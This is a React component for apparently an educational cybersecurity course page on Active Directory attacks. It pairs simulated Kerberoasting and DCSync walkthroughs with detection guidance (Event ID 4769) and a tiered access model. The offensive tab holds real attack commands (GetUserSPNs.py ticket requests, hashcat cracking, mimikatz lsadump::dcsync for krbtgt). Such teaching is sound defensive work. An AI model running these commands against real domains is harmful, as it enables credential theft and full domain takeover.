import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useState } from "react";
import { Link } from "react-router-dom";
import { Home, ChevronLeft, ChevronRight } from "lucide-react";

const Level8 = () => {
  const [activeTab, setActiveTab] = useState("overview");

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      <main className="pt-24 px-4">
        <div className="container mx-auto max-w-4xl">
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold mb-4 cyber-gradient">Level 8: Active Directory Attacks</h1>
            <p className="text-xl text-muted-foreground">Target the heart of the corporate network: The Domain Controller.</p>
          </div>
          <div className="sticky top-20 z-40 glass border border-border/50 rounded-lg p-1 mb-8">
            <div className="flex space-x-1">
              {[{ id: "overview", label: "1. Overview: The Kingdom's Keys" }, { id: "offensive", label: "2. Offensive Ops" }, { id: "defensive", label: "3. Defensive Ops" }].map((tab) => (
                <button key={tab.id} onClick={() => setActiveTab(tab.id)} className={`flex-1 px-4 py-2 rounded-md font-medium transition-all ${activeTab === tab.id ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'}`}>{tab.label}</button>
              ))}
            </div>
          </div>
          {activeTab === "overview" && (
            <div className="space-y-8">
              <Card className="glass">
                <CardHeader>
                  <CardTitle>The Kingdom's Keys</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-muted-foreground mb-6">
                    Active Directory (AD) is the "keys to the kingdom" in most corporate networks, managing all user identities and permissions.
                  </p>
                  <div className="text-center">
                    <div className="inline-block p-6 border-2 border-primary/50 rounded-lg">
                      <div className="text-lg font-semibold text-primary mb-4">Domain Controller</div>
                      <div className="grid grid-cols-3 gap-4 text-sm">
                        <div className="p-2 bg-card/50 rounded cursor-pointer hover:bg-primary/20" onClick={() => {
                          const info = document.getElementById('ad-info');
                          if (info) info.innerHTML = '<strong>Organizational Units (OUs):</strong> Containers that organize users, groups, and computers for easier management and policy application.';
                        }}>
                          Organizational Units
                        </div>
                        <div className="p-2 bg-card/50 rounded cursor-pointer hover:bg-primary/20" onClick={() => {
                          const info = document.getElementById('ad-info');
                          if (info) info.innerHTML = '<strong>User Accounts:</strong> Individual identities that authenticate users and define their access permissions across the network.';
                        }}>
                          User Accounts
                        </div>
                        <div className="p-2 bg-card/50 rounded cursor-pointer hover:bg-primary/20" onClick={() => {
                          const info = document.getElementById('ad-info');
                          if (info) info.innerHTML = '<strong>Group Policies:</strong> Centralized configuration management that controls user and computer settings across the domain.';
                        }}>
                          Group Policies
                        </div>
                      </div>
                    </div>
                    <div id="ad-info" className="mt-4 p-4 bg-card/50 border border-border/50 rounded-lg text-sm">
                      Click on an AD component to learn more about its function.
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "offensive" && (
            <div className="space-y-8">
              <Card className="glass border-red-500/20">
                <CardHeader>
                  <CardTitle className="text-red-400">Compromising the Domain</CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-4">Kerberoasting Attack</h3>
                    <div className="space-y-4">
                      <div id="kerberoasting-terminal" className="p-4 bg-black/50 border border-green-500/50 rounded-lg font-mono text-sm text-green-400">
                        C:\{'>'}  <span id="kerberos-output">Click "Next Step" to begin the attack...</span>
                      </div>
                      <Button 
                        id="kerberos-btn"
                        onClick={() => {
                          const steps = [
                            "GetUserSPNs.py -request domain.com/user:password",
                            "Found SPN: HTTP/webapp.domain.com\nRequesting ticket for HTTP/webapp.domain.com...",
                            "$krb5tgs$23$*webapp$DOMAIN.COM$HTTP/webapp.domain.com*$abc123...",
                            "hashcat -m 13100 ticket.txt rockyou.txt\n\nCracked: ServiceAccount123!",
                          ];
                            const btn = document.getElementById('kerberos-btn') as HTMLButtonElement;
                            const output = document.getElementById('kerberos-output') as HTMLElement;
                          const currentStep = parseInt(btn.dataset.step || '0');
                          
                          if (currentStep < steps.length) {
                            output.innerHTML = steps[currentStep];
                            btn.dataset.step = (currentStep + 1).toString();
                            
                            if (currentStep === steps.length - 1) {
                              btn.textContent = 'Attack Complete';
                              btn.classList.add('bg-green-500');
                              btn.disabled = true;
                            }
                          }
                        }}
                        variant="destructive"
                        data-step="0"
                      >
                        Next Step
                      </Button>
                    </div>
                  </div>
                  
                  <div>
                    <h3 className="text-lg font-semibold mb-4">DCSync Attack</h3>
                    <div className="space-y-4">
                      <div className="p-4 bg-black/50 border border-red-500/50 rounded-lg font-mono text-sm text-red-400">
                        mimikatz # lsadump::dcsync /user:krbtgt<br/>
                        <span className="text-yellow-400">
                          [DC] 'domain.com' will be the domain<br/>
                          Object RDN           : krbtgt<br/>
                          ** SAM ACCOUNT **<br/>
                          Hash NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br/>
                          <span className="text-green-400">*** Golden Ticket acquired! ***</span>
                        </span>
                      </div>
                      <p className="text-sm text-muted-foreground">
                        With the krbtgt hash, the attacker can forge authentication tickets for any user in the domain.
                      </p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "defensive" && (
            <div className="space-y-8">
              <Card className="glass border-blue-500/20">
                <CardHeader>
                  <CardTitle className="text-blue-400">Defending the Domain</CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-4">Detecting Kerberoasting</h3>
                    <div className="p-4 bg-card/50 border border-border/50 rounded-lg font-mono text-sm space-y-2">
                      <div className="text-muted-foreground">Event ID 4769 - Kerberos service ticket requests:</div>
                      <div className="cursor-pointer hover:bg-blue-500/20 p-1 rounded">2024-01-15 09:15:23 - john.doe - HTTP/webapp.domain.com - RC4-HMAC</div>
                      <div className="cursor-pointer hover:bg-blue-500/20 p-1 rounded">2024-01-15 09:15:45 - jane.smith - CIFS/fileserver.domain.com - AES256-SHA1</div>
                      <div 
                        className="cursor-pointer hover:bg-red-500/20 p-1 rounded text-yellow-400"
                        onClick={(e) => {
                          (e.target as HTMLElement).classList.add('bg-red-500/50');
                          const msg = document.getElementById('kerberos-detection-msg');
                          if (msg) msg.style.display = 'block';
                        }}
                      >
                        2024-01-15 09:16:12 - bob.attacker - Multiple SPNs (15 requests) - RC4-HMAC
                      </div>
                      <div className="cursor-pointer hover:bg-blue-500/20 p-1 rounded">2024-01-15 09:16:30 - alice.admin - LDAP/dc.domain.com - AES256-SHA1</div>
                    </div>
                    <div id="kerberos-detection-msg" style={{display: 'none'}} className="mt-2 p-2 bg-blue-500/20 border border-blue-500/50 rounded text-sm">
                      ✅ Correct! Multiple rapid SPN requests with weak encryption (RC4) indicates Kerberoasting.
                    </div>
                  </div>

                  <div>
                    <h3 className="text-lg font-semibold mb-4">Tiered Access Model</h3>
                    <div className="space-y-4">
                      <div className="grid grid-cols-3 gap-4 text-center">
                        <div className="p-4 border border-red-500/50 rounded-lg">
                          <div className="text-red-400 font-medium">Tier 0</div>
                          <div className="text-sm">Domain Controllers</div>
                        </div>
                        <div className="p-4 border border-yellow-500/50 rounded-lg">
                          <div className="text-yellow-400 font-medium">Tier 1</div>
                          <div className="text-sm">Servers</div>
                        </div>
                        <div className="p-4 border border-green-500/50 rounded-lg">
                          <div className="text-green-400 font-medium">Tier 2</div>
                          <div className="text-sm">Workstations</div>
                        </div>
                      </div>
                      <div className="p-4 bg-card/50 border border-border/50 rounded-lg">
                        <div className="text-sm text-muted-foreground mb-2">Principle: Workstation Admin accounts should NEVER access Domain Controllers</div>
                        <Button 
                          onClick={() => {
                            const msg = document.getElementById('tiered-msg');
                            if (msg) msg.style.display = 'block';
                          }}
                          variant="outline" 
                          size="sm"
                        >
                          Implement Separation
                        </Button>
                        <div id="tiered-msg" style={{display: 'none'}} className="mt-2 p-2 bg-blue-500/20 border border-blue-500/50 rounded text-sm">
                          ✅ Tiered access prevents lateral movement by restricting admin accounts to their appropriate tier.
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
          <div className="flex justify-between items-center py-8">
            <Button asChild variant="cyber-ghost" size="lg"><Link to="/level/7" className="flex items-center gap-2"><ChevronLeft className="w-4 h-4" />Previous</Link></Button>
            <Button asChild variant="cyber-ghost" size="lg"><Link to="/" className="flex items-center gap-2"><Home className="w-4 h-4" />Home</Link></Button>
            <Button asChild variant="cyber" size="lg"><Link to="/level/9" className="flex items-center gap-2">Next<ChevronRight className="w-4 h-4" /></Link></Button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Level8;